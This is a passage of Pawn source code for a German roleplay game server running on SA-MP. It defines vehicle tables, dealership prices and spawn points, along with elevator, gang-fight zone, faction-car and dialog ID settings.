50,//"Feltzer",
50,//"Remington",
55,//"Slamvan",
55,//"Blade",
100,//"Freight",
100,//"Streak",
100,//"Vortex",
48,//"Vincent",
55,//"Bullet",
58,//"Clover",
60,//"Sadler",
90,//"Firetruck",
60,//"Hustler",
50,//"Intruder",
40,//"Primo",
130,//"Cargobob",
60,//"Tampa",
60,//"Sunrise",
60,//"Merit",
100,//"Utility",
50,//"Nevada",
80,//"Yosemite",
60,//"Windsor",
100,//"Monster Truck",
100,//"Monster Truck",
55,//"Uranus",
60,//"Jester",
60,//"Sultan",
60,//"Stratum",
60,//"Elegy",
150,//"Raindance",
100,//"RC Tiger",
50,//"Flash",
50,//"Tahoma",
55,//"Savanna",
60,//"Bandito",
100,//"Freight",
100,//"Trailer",
20,//"Kart",
20,//"Mower",
200,//"Duneride",
35,//"Sweeper",
50,//"Broadway",
50,//"Tornado",
200,//"AT-400",
200,//"DFT-30",
65,//"Huntley",
60,//"Stafford",
40,//"BF-400",
70,//"Newsvan",
30,//"Tug",
100,//"Trailer",
50,//"Emperor",
40,//"Wayfarer",
60,//"Euros",
90,//"Hotdog",
60,//"Club",
100,//"Trailer",
100,//"Trailer",
200,//"Andromada",
95,//"Dodo",
100,//"RC Cam",
50,//"Launch",
60,//"Streifenwagen",
60,//"Streifenwagen",
60,//"Streifenwagen",
75,//"Polizei Ranger",
50,//"Picador",
75,//"S.W.A.T. Van",
55,//"Alpha",
55,//"Phoenix",
50,//"Glendale",
50,//"Sadler",
100,//"Luggage Trailer",
100,//"Luggage Trailer",
100,//"Stair Trailer",
52,//"Boxville",
100,//"Farm Plow",
100//"Utility Trailer"
};

// DTC Cars
new SideL, SideR;
new Dtc_PlayerHaveCar[MAX_PLAYERS][MaxVeh];
new Dtc_PlayerKey[MAX_PLAYERS];
new RadZahl[AUTOHAUSER];
new dtc_AutohausCar[MAX_PLAYERS],dtc_AutohausCat[MAX_PLAYERS],dtc_AutohausSCar[MAX_PLAYERS];

enum dtcCarModell
{
	dtc_Autohaus,
	dtc_CarModel,
	dtc_CarPreis
};
new dtcKaufliste[][dtcCarModell] = {
//1 = Intercars (Mittel-Teuer)
	{0,467,50000},  //Oceanic
	{0,536,20000},  //Blade
	{0,534,20000},  //Remigton
	{0,567,20000},  //Savanna
	{0,535,20000},  //Slamvan
	{0,412,200000},  //Voodo
	{0,458,70000},  //Solair
	{0,479,50000},  //Regina
	{0,518,50000},   //Buccanee
	{0,542,20000},   //Clover
	{0,496,7000},  //Blistac
	{0,439,10000},  //Stallion
	{0,579,15000},  //Huntley
	{0,507,50000},  //Elegant
	{0,589,10000},  //Club
	{0,602,20000},  //Alpha
	{0,400,70000},  //Landstal
	{0,405,50000}, //Sentinel
	{0,482,50000},  //Burrito
//2 = SF WangCars (Mittel-Gemischt)
	{1,550,27500},  //Sunrise
	{1,540,17500},  //Vincent
	{1,404,21000},  //Peren
	{1,533,33100},  //Feltzer
	{1,500,26700},  //Mesa
	{1,508,19000},  //Journey
 	{1,545,39090},  //Hustler
	{1,554,16000},  //Yosemite
	{1,565,29000},  //Flash
	{1,561,25000},  //Startum
	{1,489,18500},  //Rancher
	{1,587,27900},  //Euros
	{1,527,17100}, //Cadrona
//3 = LS Grottis
	{2,409,450000},//1
	{2,429,150000},//2
	{2,411,365000},//3
	{2,415,100000},//4
	{2,451,70000},//5
	{2,541,350000},//6
	{2,559,330000},//7
	{2,560,220000},//8
	{2,506,150000},//9
	{2,522,500000},//10
// Airport LS
	{3,519,2470000},//5
	{3,487,350000},//6
	{3,593,380000},//7
// Rastplatz
	{4,424,700000},//5
	{4,483,350000},//6
	{4,502,330000},//7
	{4,503,330000},//7
	{4,568,330000},//7
	{4,578,330000},//7
	{4,531,330000},//7
	{4,478,330000},//7
	{4,495,330000},//7
// Coutt and Schutz
	{5,581,70000},//5
	{5,586,35000},//6
	{5,468,33000},//7
	{5,471,33000},//7
	{5,521,33000},//7
	{5,481,33000},//7
	{5,463,33000},//7
	{5,461,37000},//7
	{5,462,39000},//7
// SF 2
	{6,549,7000},//5
	{6,555,3500},//6
	{6,546,3300},//7
	{6,585,3300},//7
	{6,516,3400},//7
	{6,547,3300},//7
	{6,543,3600},//7
	{6,517,3500},//7
// Boote
	{7,493,7000},//5
	{7,472,3500},//6
	{7,473,3300},//7
	{7,454,3300},//7
	{7,452,3400},//7
	{7,453,3300}//7
};
new Float:DtcParkPlatz[AUTOHAUSER][MAXPARKPLATZE][6] = {
	{//LS Intercars
		{738.1342, -1351.2081, 13.3682, 270.0}, // Das sind die verschiedenen Ausgabepunkte
		{738.3634, -1347.4786, 13.3505, 270.0},
		{738.1717, -1343.6742, 13.3594, 270.0},
		{737.9954, -1339.6033, 13.3678, 270.0},
		{738.1342, -1351.2081, 13.3682, 270.0},
		{738.3634, -1347.4786, 13.3505, 270.0},
		{738.1342, -1351.2081, 13.3682, 270.0}, // Das sind die verschiedenen Ausgabepunkte
		{738.3634, -1347.4786, 13.3505, 270.0},
		{738.1717, -1343.6742, 13.3594, 270.0},
		{737.9954, -1339.6033, 13.3678, 270.0},
		{738.1342, -1351.2081, 13.3682, 270.0},
		{738.3634, -1347.4786, 13.3505, 270.0}
	},
	{//SF WangCars
		{-1989.7611, 274.7534, 34.8779, 264.6156}, // Das sind die verschiedenen Ausgabepunkte
		{-1989.5825, 269.7829, 34.8801, 267.2173},
		{-1990.5858, 264.7871, 34.8799, 266.7876},
		{-1990.8823, 261.4637, 34.8847, 269.7044},
		{-1991.2576, 256.8243, 34.8771, 268.2578},
		{-1992.4147, 251.5304, 34.8773, 265.7555},
		{-1989.7611, 274.7534, 34.8779, 264.6156}, // Das sind die verschiedenen Ausgabepunkte
		{-1989.5825, 269.7829, 34.8801, 267.2173},
		{-1990.5858, 264.7871, 34.8799, 266.7876},
		{-1990.8823, 261.4637, 34.8847, 269.7044},
		{-1991.2576, 256.8243, 34.8771, 268.2578},
		{-1992.4147, 251.5304, 34.8773, 265.7555}
	},
	{//Grottis LS
		{549.6224, -1264.7831, 17.2422, 303.4911}, // Das sind die verschiedenen Ausgabepunkte
		{539.8518, -1271.6110, 17.2422, 302.5511},
		{539.8518, -1271.6110, 17.2422, 302.5511},
		{549.6224, -1264.7831, 17.2422, 303.4911},
	    {539.8518, -1271.6110, 17.2422, 302.5511},
		{549.6224, -1264.7831, 17.2422, 303.4911},
		{549.6224, -1264.7831, 17.2422, 303.4911}, // Das sind die verschiedenen Ausgabepunkte
		{539.8518, -1271.6110, 17.2422, 302.5511},
		{539.8518, -1271.6110, 17.2422, 302.5511},
		{549.6224, -1264.7831, 17.2422, 303.4911},
	    {539.8518, -1271.6110, 17.2422, 302.5511},
		{549.6224, -1264.7831, 17.2422, 303.4911}
	},
	{//Airport LS
		{1948.3745,-2632.7227,13.5469,353.4502}, // Das sind die verschiedenen Ausgabepunkte
		{1948.3745,-2632.7227,13.5469,353.4502},
		{1948.3745,-2632.7227,13.5469,353.4502},
		{1948.3745,-2632.7227,13.5469,353.4502},
	    {1948.3745,-2632.7227,13.5469,353.4502},
		{1948.3745,-2632.7227,13.5469,353.4502},
		{1948.3745,-2632.7227,13.5469,353.4502}, // Das sind die verschiedenen Ausgabepunkte
		{1948.3745,-2632.7227,13.5469,353.4502},
		{1948.3745,-2632.7227,13.5469,353.4502},
		{1948.3745,-2632.7227,13.5469,353.4502},
	    {1948.3745,-2632.7227,13.5469,353.4502},
		{1948.3745,-2632.7227,13.5469,353.4502}
	},
	{//Rastplatz
		{-561.9392,-1057.1246,23.8380,148.4031}, // Das sind die verschiedenen Ausgabepunkte
		{-561.9392,-1057.1246,23.8380,148.4031},
		{-561.9392,-1057.1246,23.8380,148.4031},
		{-561.9392,-1057.1246,23.8380,148.4031},
	    {-561.9392,-1057.1246,23.8380,148.4031},
		{-561.9392,-1057.1246,23.8380,148.4031},
		{-561.9392,-1057.1246,23.8380,148.4031}, // Das sind die verschiedenen Ausgabepunkte
		{-561.9392,-1057.1246,23.8380,148.4031},
		{-561.9392,-1057.1246,23.8380,148.4031},
		{-561.9392,-1057.1246,23.8380,148.4031},
	    {-561.9392,-1057.1246,23.8380,148.4031},
		{-561.9392,-1057.1246,23.8380,148.4031}
	},
	{//Coutt and Schutz
		{2127.2190,-1147.1564,24.4941,349.5117}, // Das sind die verschiedenen Ausgabepunkte
		{2127.2190,-1147.1564,24.4941,349.5117},
		{2127.2190,-1147.1564,24.4941,349.5117},
		{2127.2190,-1147.1564,24.4941,349.5117},
	    {2127.2190,-1147.1564,24.4941,349.5117},
		{2127.2190,-1147.1564,24.4941,349.5117},
		{2127.2190,-1147.1564,24.4941,349.5117}, // Das sind die verschiedenen Ausgabepunkte
		{2127.2190,-1147.1564,24.4941,349.5117},
		{2127.2190,-1147.1564,24.4941,349.5117},
		{2127.2190,-1147.1564,24.4941,349.5117},
	    {2127.2190,-1147.1564,24.4941,349.5117},
		{2127.2190,-1147.1564,24.4941,349.5117}
	},
	{//SF 2
		{-1636.3428,1201.6342,7.1797,226.4174}, // Das sind die verschiedenen Ausgabepunkte
		{-1636.3428,1201.6342,7.1797,226.4174},
		{-1636.3428,1201.6342,7.1797,226.4174},
		{-1636.3428,1201.6342,7.1797,226.4174},
	    {-1636.3428,1201.6342,7.1797,226.4174},
		{-1636.3428,1201.6342,7.1797,226.4174},
		{-1636.3428,1201.6342,7.1797,226.4174}, // Das sind die verschiedenen Ausgabepunkte
		{-1636.3428,1201.6342,7.1797,226.4174},
		{-1636.3428,1201.6342,7.1797,226.4174},
		{-1636.3428,1201.6342,7.1797,226.4174},
	    {-1636.3428,1201.6342,7.1797,226.4174},
		{-1636.3428,1201.6342,7.1797,226.4174}
	},
	{//Boote
		{805.0563,-1906.8767,-0.5012,164.7732}, // Das sind die verschiedenen Ausgabepunkte
		{805.0563,-1906.8767,-0.5012,164.7732},
		{805.0563,-1906.8767,-0.5012,164.7732},
		{805.0563,-1906.8767,-0.5012,164.7732},
	    {805.0563,-1906.8767,-0.5012,164.7732},
		{805.0563,-1906.8767,-0.5012,164.7732},
		{805.0563,-1906.8767,-0.5012,164.7732}, // Das sind die verschiedenen Ausgabepunkte
		{805.0563,-1906.8767,-0.5012,164.7732},
		{805.0563,-1906.8767,-0.5012,164.7732},
		{805.0563,-1906.8767,-0.5012,164.7732},
	    {805.0563,-1906.8767,-0.5012,164.7732},
		{805.0563,-1906.8767,-0.5012,164.7732}
	},
	{//Noobspawn Clover
		{870.1673,-1658.8152,13.3040,180.0000},
		{874.5705,-1658.8152,13.3040,180.0000},
		{879.3169,-1658.8152,13.3040,180.0000},
		{883.7359,-1658.8152,13.3041,180.0000},
		{888.3871,-1658.8152,13.3041,180.0000},
		{892.3199,-1658.8152,13.3041,180.0000},
		{892.4316,-1669.0115,13.2947,0.2903},
		{888.2554,-1669.0326,13.2946,0.2903},
		{883.5235,-1669.0566,13.2946,0.2903},
		{878.8563,-1669.0806,13.2946,0.2903},
		{874.8430,-1669.1008,13.2946,0.2903},
		{869.6099,-1669.1277,13.2946,0.2903}
	}
};


enum dtc_PlayerCar
{
	CarId,
	CarOwner[MAX_PLAYER_NAME],
	CarModel,
	Float:CarPos_x,
	Float:CarPos_y,
	Float:CarPos_z,
	Float:CarRotate,
	CarNitro,
	CarHyd,
	CarWheel,
	CarAusp,
	CarSideL,
	CarSideR,
	CarFB,
	CarRB,
	CarSpoiler,
	CarRoof,
	CarHood,
	CarVents,
	CarLamps,
	CarPJ,
	CarC1,
	CarC2,
	CarPreis,
	Plate[15],
	Neon,
	Kilometer,
	Benzin,
	Abgeschleppt,
	LPG,
	// Kofferaum System
	CarDrogen,
	CarMats,
	CarDeagle,
	CarShotgun,
	CarMP5,
	CarAk47,
	CarM4,
	CarRifle,
	CarSniper,
	CarGivekey[MAX_PLAYER_NAME],// Spawn von Die Sieben Zwerge
	CarBuyedDay,
	CarBuyedMonth,
	CarBuyedYear,
	CarTurbo,
	IsWohnwagen,
	BombeDrin,
	SoundSystem,
	SoundSystemData

};

new PlayerCar[MAX_PLAYERS][MaxVeh][dtc_PlayerCar];

new CarName[][] =
{
    "Landstalker", "Bravura", "Buffalo", "Linerunner", "Perrenial", "Sentinel",
	"Dumper", "Firetruck", "Trashmaster", "Stretch", "Manana", "Infernus",
	"Voodoo", "Pony", "Mule", "Cheetah", "Ambulance", "Leviathan", "Moonbeam",
    "Esperanto", "Taxi", "Washington", "Bobcat", "Whoopee", "BF Injection",
	"Hunter", "Premier", "Enforcer", "Securicar", "Banshee", "Predator", "Bus",
	"Rhino", "Barracks", "Hotknife", "Trailer", "Previon", "Coach", "Cabbie",
	"Stallion", "Rumpo", "RC Bandit", "Romero", "Packer", "Monster", "Admiral",
	"Squalo", "Seasparrow", "Pizzaboy", "Tram", "Trailer", "Turismo", "Speeder",
	"Reefer", "Tropic", "Flatbed", "Yankee", "Caddy", "Solair", "Berkley's RC Van",
	"Skimmer", "PCJ-600", "Faggio", "Freeway", "RC Baron", "RC Raider", "Glendale",
	"Oceanic","Sanchez", "Sparrow", "Patriot", "Quad", "Coastguard", "Dinghy",
	"Hermes", "Sabre", "Rustler", "ZR-350", "Walton", "Regina", "Comet", "BMX",
	"Burrito", "Camper", "Marquis", "Baggage", "Dozer", "Maverick", "News Chopper",
	"Rancher", "FBI Rancher", "Virgo", "Greenwood", "Jetmax", "Hotring", "Sandking",
	"Blista Compact", "Police Maverick", "Boxvillde", "Benson", "Mesa", "RC Goblin",
	"Hotring Racer A", "Hotring Racer B", "Bloodring Banger", "Rancher", "Super GT",
	"Elegant", "Journey", "Bike", "Mountain Bike", "Beagle", "Cropduster", "Stunt",
 	"Tanker", "Roadtrain", "Nebula", "Majestic", "Buccaneer", "Shamal", "Hydra",
 	"FCR-900", "NRG-500", "HPV1000", "Cement Truck", "Tow Truck", "Fortune",
 	"Cadrona", "FBI Truck", "Willard", "Forklift", "Tractor", "Combine", "Feltzer",
 	"Remington", "Slamvan", "Blade", "Freight", "Streak", "Vortex", "Vincent",
    "Bullet", "Clover", "Sadler", "Firetruck", "Hustler", "Intruder", "Primo",
	"Cargobob", "Tampa", "Sunrise", "Merit", "Utility", "Nevada", "Yosemite",
	"Windsor", "Monster", "Monster", "Uranus", "Jester", "Sultan", "Stratum",
	"Elegy", "Raindance", "RC Tiger", "Flash", "Tahoma", "Savanna", "Bandito",
    "Freight Flat", "Streak Carriage", "Kart", "Mower", "Dune", "Sweeper",
	"Broadway", "Tornado", "AT-400", "DFT-30", "Huntley", "Stafford", "BF-400",
	"News Van", "Tug", "Trailer", "Emperor", "Wayfarer", "Euros", "Hotdog", "Club",
	"Freight Box", "Trailer", "Andromada", "Dodo", "RC Cam", "Launch", "Police Car",
 	"Police Car", "Police Car", "Police Ranger", "Picador", "S.W.A.T", "Alpha",
 	"Phoenix", "2. Gebrauchtwagen", "1. Gebrauchtwagen", "Luggage", "Wohnwagen", "Stairs", "Boxville",
 	"Tiller", "Utility Trailer"
};




static VehicleDriverPlayerid[MAX_VEHICLES] = { INVALID_PLAYER_ID, ... };

stock IsKeyReleased(key, newkeys, oldkeys)
{
	if(!(newkeys & key) && (oldkeys & key))
		return 1;

	return 0;
}


#define BDIALOG_ID           (4322)

// Position defines
#define BX_DOOR_R_OPENED     (289.542419)
#define BX_DOOR_L_OPENED     (286.342407)
#define BY_DOOR_R_OPENED     (-1609.640991)
#define BY_DOOR_L_OPENED     (-1609.076049)

#define BX_FDOOR_R_OPENED    (289.492431)
#define BX_FDOOR_L_OPENED    (286.292419)
#define BY_FDOOR_R_OPENED    (-1609.870971)
#define BY_FDOOR_L_OPENED    (-1609.306030)

#define BGROUND_Z_COORD      (18.755348)     // (33.825077)
#define BX_ELEVATOR_POS      (287.942413)
#define BY_ELEVATOR_POS      (-1609.341064)




static BFloorNames[14][] =
{
	"Car Park",
	"Ground Floor",
	"First Floor",
	"Second Floor",
	"Third Floor",
	"Fourth Floor",
	"Fifth Floor",
	"Sixth Floor",
	"Seventh Floor",
	"Eighth Floor",
	"Ninth Floor",
	"Tenth Floor",
	"Eleventh Floor",
	"Twelfth Floor"
};


static Float:BFloorZOffsets[14] =
{
    0.0, 		// Car Park
    15.069729,  // Ground Floor
    29.130733,	// First Floor
    33.630733,  // Second Floor = 29.130733 + 4.5
    38.130733,  // Third Floor = 33.630733 + 4.5
    42.630733,  // Fourth Floor = 38.130733 + 4.5
    47.130733,  // Fifth Floor = 42.630733 + 4.5
    51.630733,  // Sixth Floor = 47.130733 + 4.5
    56.130733,  // Seventh Floor = 51.630733 + 4.5
    60.630733,  // Eighth Floor = 56.130733 + 4.5
    65.130733,  // Ninth Floor = 60.630733 + 4.5
    69.630733,  // Tenth Floor = 65.130733 + 4.5
    74.130733,  // Eleventh Floor = 69.630733 + 4.5
    78.630733,  // Twelfth Floor = 74.130733 + 4.5
};


new BObj_Elevator, BObj_ElevatorDoors[2], BObj_FloorDoors[14][2];


new Text3D:BLabel_Elevator, Text3D:BLabel_Floors[14];


new BElevatorState;


new	BElevatorFloor;


new BElevatorQueue[14];


new	BFloorRequestedBy[14];


new BElevatorBoostTimer;

// -----------------------------------------------------------------------------
// Function Forwards
// -----------------

// Public:
forward BCallElevator(playerid, floorid);    // You can use INVALID_PLAYER_ID too.
forward BShowElevatorDialog(playerid);

// Private:
forward BElevator_Initialize();
forward BElevator_Destroy();

forward BElevator_OpenDoors();
forward BElevator_CloseDoors();
forward BFloor_OpenDoors(floorid);
forward BFloor_CloseDoors(floorid);

forward BElevator_MoveToFloor(floorid);
forward BElevator_Boost(floorid);        	// Increases the elevator speed until it reaches 'floorid'.
forward BElevator_TurnToIdle();

forward BReadNextFloorInQueue();
forward BRemoveFirstQueueFloor();
forward BAddFloorToQueue(floorid);
forward BIsFloorInQueue(floorid);
forward BResetBElevatorQueue();

forward BDidPlayerRequestElevator(playerid);

forward Float:BGetElevatorZCoordForFloor(floorid);
forward Float:BGetDoorsZCoordForFloor(floorid);


#define DIALOG_CH2 1561
#define DIALOG_BUY                  19402
#define DIALOG_SERVICE              23244
#define DIALOG_DESKKICK			    23243
#define DIALOG_FBIUNIFORM           23242
#define DIALOG_FBIEQUIP             23241
#define DIALOG_ZOLLCONTROL          23240
#define DIALOG_ZOLLCONTROL2         23239
#define DIALOG_WEQUIP               23238
#define DIALOG_ARBOBJ              	23237 // Wenn im Script bereits definiert Zahlenwert ändern
#define DIALOG_AUSGEWAEHLT          23236 // Wenn im Script bereits definiert Zahlenwert ändern
#define DIALOG_ALLG                 23235 // Wenn im Script bereits definiert Zahlenwert ändern
#define DIALOG_OBJINPUT             23234 // Wenn im Script bereits definiert Zahlenwert ändern
#define MAX_Objekt 					50 // Deine Maximale Objekt Anzahl
#define NAME                        MAX_PLAYER_NAME
#define Aktiv_3DText				 // Ausklammern falls unerwünscht
#define	MAX_DESKTOP_TIME 60
/*
new Desktop_Check[MAX_PLAYERS];
new Desktop_Status[MAX_PLAYERS];
new Desktop_Timer[MAX_PLAYERS];
new Desktop_Timer_Started[MAX_PLAYERS];
*/
new UCL[MAX_PLAYERS];

new newsSperre[MAX_PLAYERS][MAX_newsObjekt], newssperrespawned[MAX_PLAYERS]; // Barriere, Objekt Anzahl
new Sperre[MAX_PLAYERS][MAX_Objekt], sperrespawned[MAX_PLAYERS]; // Barriere, Objekt Anzahl
#if defined Aktiv_3DText
	new Text3D:SperreLabel[MAX_PLAYERS][MAX_Objekt]; // 3D TextLabel
#endif
new Float:pX, Float:pY, Float:pZ, Float:pR; // Positionen, Blickrichtung
new stringx[128]; // Allgemeiner String
new Objekt[MAX_PLAYERS]; // Auswahl des Objektes
new ObjektID[MAX_PLAYERS]; // Die eigen Einstellbare Objekt ID
new	PlayerText3D:WantedLabel[MAX_PLAYERS];
/********************************************************************************************************************/
//============================================ 0.3c DEFINITIONEN ====================================================
/********************************************************************************************************************/
#define DIALOG_ORGINVITE 5263
#define DIALOG_INVITE 5253
#define COL_EASY             "{FFF1AF}"
#define COL_WHITE            "{FFFFFF}"
#define COL_BLACK            "{0E0101}"
#define COL_GREY             "{C3C3C3}"
#define COL_GREEN            "{6EF83C}"
#define COL_DARKGREEN        "{009933}"
#define COL_RED              "{F81414}"
#define COL_YELLOW           "{F3FF02}"
#define COL_ORANGE           "{FFAF00}"
#define COL_LIME             "{B7FF00}"
#define COL_CYAN             "{00FFEE}"
#define COL_LIGHTBLUE        "{00C0FF}"
#define COL_BLUE             "{0049FF}"
#define COL_MAGENTA          "{F300FF}"
#define COL_VIOLET           "{B700FF}"
#define COL_PINK             "{FF00EA}"
#define COL_MARONE           "{A90202}"
#define COL_CMD              "{B8FF02}"
#define COL_PARAM          	 "{3FCD02}"
#define COL_SERVER           "{AFE7FF}"
#define COL_VALUE         	 "{A3E4FF}"
#define COL_RULE          	 "{F9E8B7}"
#define COL_RULE2        	 "{FBDF89}"
#define COL_RWHITE        	 "{FFFFFF}"
#define COL_LGREEN        	 "{C9FFAB}"
#define COL_LRED			 "{FFA1A1}"
#define COL_LRED2         	 "{C77D87}"
//=================================================
//===========================================================================================================================
//================================================= Gangfight
#define FS_COL_GREY         	(0xAFAFAFAA)
#define FS_COL_YELLOW       	(0xFFFF00FF)
forward Fight_Init();
forward Fight_Close();
forward FightUpdate_1();
forward FightUpdate_2();
enum fsSyS{
	Float:fsMinX,
	Float:fsMinY,
	Float:fsMaxX,
	Float:fsMaxY,
	Float:fsCTFx,
	Float:fsCTFy,
	Float:fsCTFz,
	fsOwnerFaction,
	fsAttackFaction,
	fsKillsOfOwner,
	fsKillsOfAttack,
	fsFightTime,
	fsCTF[3],
	fsLastFight,
	fsZoneID,
	fsFlag,
	Text:fsWinFaction,
	Text:fsLoseFaction,
	Text:fsWinKills,
	Text:fsLoseKills,
	Text:fsTime
};




new FightSystem[][fsSyS]={
	/*MinX, MinY, MaxX, MaxY, CTFx, CTFy, CTFz*/
	{1060.145,-1721.339,1166.624,-1583.168,1072.4016,-1619.3834,20.4583},//Kaufhaus
	{990.2909,1821.38,1177.724,2057.332,1067.5798,1884.2932,10.8203},//Container
	{-887.5186,1377.989,-583.8938,1634.903,-813.6335,1525.2080,26.5065},//Wüste
	{-2506.7,740.0255,-2383.094,826.8147,2459.4094,787.3281,35.1719},//Markt
	{-1850.044,1438.284,-1710.987,1584.248,-1789.1478,1543.3608,7.1875},//Hafen
	{-1891.4263,857.8361,-1722.0261,1095.5897,-1720.0752,1018.2902,17.5859},//Bank
	{1828.318,-1938.465,2071.699,-1760.817,1958.6156,-1853.2424,4.3392},//Tanke
	{1828.0573,-2161.2705,1956.4136,-2057.7964,1924.0941,-2125.0146,13.5826},//Airport(LS)
	{906.7744,-1561.5994,807.6274,-1416.7367,841.4399,-1485.7002,13.5947}//AutohausLS
};
new Text:Fight,Text:FightUnderline;
new FightTimer[2];
//================================================================================================================

//================================================================================================================
//========================================================================= GANGAUTOHAUS/  FRAKCARS
#define FACTION_CAR_FILE                    ("Fraktionsautos.cfg")//Datei wo die gesamten Fraktionsfahrzeuge gespeichert werden GDRlen!
#define MAX_FACTION_CARS 					(1000)//Die Maximale anzahl von Fraktionsfahrzeugen!
#define NEEDED_ADMINLEVEL                   (2002)//Das benötigte Adminlevel um Fraktionfahrzeuge zu fahren, ab/-aufschließen, umzuparken, entfernen, erstellen.
#define MAX_FACTIONS                        (24)//Die Maximale anzahl von Fraktionen aus deinem Script!
#define MAX_BUY         					(40)//Die Maximale anzahl von Fahrzeugen die eine Fraktion kaufen darf!


#if defined FACTION_CARS_LOCKABLE
#include <ForAllPlayers>
#endif

#define FACTION_COL_GREY                    (0xAFAFAFAA)
#define FACTION_COL_YELLOW                  (0xFFFF00FF)
#define DIALOG_FACTION_CAR_BUY              (3775) // Vorher 37

//new supmobil[MAX_PLAYERS], Text3D:suptext[MAX_PLAYERS],suplabeltimer[MAX_PLAYERS];

forward LoadFactionCars();
forward SaveFactionCars(bool:destroy);
//forward LockFactionCarDoors();
forward DestroyAndCreateFactionCar(fc);
forward RemoveComponent(vehicleid,componentid);
forward ChangePaintjob(vehicleid,paintjobid);
forward ChangeColor(vehicleid,color1,color2);
forward RespawnFactionBuylist();

enum fCar
{
    fCarid,
	fVehid,
	Float:fPos[4],
	fCol[2],
	fFaction[5],
	fTuning[19],
	fPrice,
	factioncardbid,
	bool:cache,
	UCLSirene
/*
	#if defined FACTION_CARS_LOCKABLE
	bool:fLock
	#endif
*/
};
new FactionCars[MAX_FACTION_CARS][fCar];
/*
#if defined FACTION_CARS_LOCKABLE
new FactionCarsTimer;
#endif
*/
//new BuylistRespawner;
new SaveFactionCarsTimer;
//new LastRespawned[MAX_FACTIONS];




// Event Sys 1.0
enum EventSystem{
	EventOwnerID,
	EventArt,
	EventActive,
	EventZeit,
	Float:EventX,
	Float:EventY,
	Float:EventZ,
	EventInterior,
	EventVWOk,
	EventMaxPlayers,
	EventMinPlayers,
	EventPlayers,
	EventEdit,
	EventWarteZeit,
	EventGestartet,
	EvCountDown,
	EventUpdateTimer,
	EventCurrentTime,
	AdminEnde,
	AdminEndeWer,
	EventSekunden,
	EventMinuten


};

new Event[EventSystem];
//
//===========================================================================================================================

//Dialoge
#define DIALOG_AUSRUESTEN 8356
#define ZUGFAHRER33 4378
#define PILOT33 7372
#define BUSFAHRER33 3713
#define DIALOG_DRINK 3643
#define MUELLMANN 4356
#define DIALOG_FRAKCAR 1064
#define DIALOG_WELCOME 2
#define DIALOG_Buslinien 9734
#define Function%0(%1) forward%0(%1); public%0(%1) // definierst du ganz oben unter includes
#define NEON 137
#define DIALOG_LOGIN 0
#define DIALOG_REG2 2
#define DIALOG_CLICK 3
#define DIALOG_CLICK_KICK 4
#define DIALOG_CLICK_BAN 5
#define DIALOG_CLICK_HEALTH
#define DIALOG_CLICK_INT 7
#define DIALOG_TICKET 8
#define DIALOG_STADION 13
#define DIALOG_KLEIDUNG_PRO 14
#define DIALOG_KLEIDUNG_ZIP 15
#define DIALOG_FW 16
#define DIALOG_BAL 18
#define DIALOG_MUCHACHO 19
#define MAFIA 25
#define NAVIHAUPT 26
#define GEBÄUDE 27
#define iORTE 28
#define AUTOHÄUSER 29
#define DIALOG_STATS 30
#define DIALOG_JOBS 31
#define DETE 32
#define MULLMANN 34
#define PILOT 35
#define ANGLER 36
#define BODYGUARD 37
#define ZEITUNGSJUNGE 38
#define BOXER 39
#define BUSFAHRER 40
#define PIZZALIEFERANT 41
#define DIALOG_iJOBS 42
#define WD 43
#define DD 44
#define HURE 45
#define AUTODIEB 46
///#define DIALOG_HANDY 47
#define Handys 48
#define Guthaben 49
#define Vertrag 50
#define Vertragk 51
#define DIALOG_UHREN 52
#define DIALOG_SHOWME 53
#define PRODI 54
#define BSN 55
#define DIALOG_COP 56
#define BANK 57
#define Kontostand 58
#define Einzahlen 59
#define Auszahlen 60
#define Uberweisen 61
#define Uberweisen2 62
#define NEWS 63
#define KAMPFSTYLES 64
#define DIALOG_TICKET_S1 65
#define DIALOG_TICKET_S22 67
#define DIALOG_TICKET_S32 68
#define DIALOG_HILFE 69
#define DIALOG_H1 70
#define DIALOG_H2 71
#define DIALOG_H3 72
#define DIALOG_H4 73
#define DIALOG_H51 74
#define DIALOG_H52 75
#define DLIALOG_ALLGEMEINE_INFOS 3612
#define DIALOG_H53 76
#define DIALOG_H54 77
#define DIALOG_H55 78
#define DIALOG_H56 79
#define DIALOG_H57 80
#define DIALOG_H58 81
#define DIALOG_H59 82
#define DIALOG_H510 83
#define DIALOG_H511 84
#define DIALOG_H512 85
#define DIALOG_H513 86
#define DIALOG_H6 87
#define DIALOG_STADTHALLE 88
#define FARMER 89
#define DIALOG_H14 90
/*
#define DIALOG_BESTRAFUNG 91
#define DIALOG_BESTRAFUNG1 92
#define DIALOG_BESTRAFUNG2 93
#define DIALOG_BESTRAFUNG3 94
#define DIALOG_BESTRAFUNG4 95
#define DIALOG_BESTRAFUNG5 96
#define DIALOG_BESTRAFUNG6 97
#define DIALOG_BESTRAFUNG7 98
#define DIALOG_BESTRAFUNG8 99
#define DIALOG_BESTRAFUNG9 100
*/
#define ANGRIFFSPUNKTE 101
#define DIALOG_KAMMER 102
#define DIALOG_KAMMER_WAFFEN1 103
#define DIALOG_KAMMER_DROGEN1 104
#define DIALOG_KAMMER_DROGEN2 105
#define DIALOG_KAMMER_DROGEN3 106
#define DIALOG_KAMMER_FMATS 107
#define DIALOG_LCN 108
#define DIALOG_H7 109
#define DIALOG_H8 110
#define DIALOG_H9 111
#define DIALOG_H10 112
#define MECHANIKER 113
#define ANWALT 114
#define DIALOG_SHOP 115
#define CLOSEZOLLLS 117
#define CLOSEZOLLLV 118
#define DIALOG_NEULING 120
#define NEULING1 121
#define NEULING2 122
#define NEULING3 128
#define KEINGUTHABEN 123
#define DIALOG_CARLIST 5464
#define DIALOG_CARKEYS 3413
#define DIALOG_RADIO 124
#define DIALOG_BEZAHLEN 125
#define DIALOG_KLINGEL 126
#define FÜHRERSCHEINE 127
// ===============================[ ServerDATEN ]===============================
#define VERSION "German Reallife" // Gamemodetext
#define TEAMSPEAKIP "X"
//======== TEAMFARBEN ========//
#define SPEEDS
#define NAMECOLOR_LSCOP 			0x1E90FF00
#define NAMECOLOR_SFCOP				0x0000FF00
#define NAMECOLOR_Bundeswehr		0x00CF0000
#define NAMECOLOR_FBI               0x1E00FF00
#define NAMECOLOR_TAXI				0xFFFF00AA
#define NAMECOLOR_MEDIC				0xFF0A0000
#define NAMECOLOR_PRAESI			0xFF1493AA
#define NAMECOLOR_PRAESI_SCHUTZ		0x669933FF
#define NAMECOLOR_YAKUZA			0x330000AA
#define NAMECOLOR_LCN				0x000000FF
#define NAMECOLOR_CNN				0xFF9900AA
#define COLOR_LEHRER				0x00FFFAFF
#define NAMECOLOR_Vagos				0xCC77E8AA
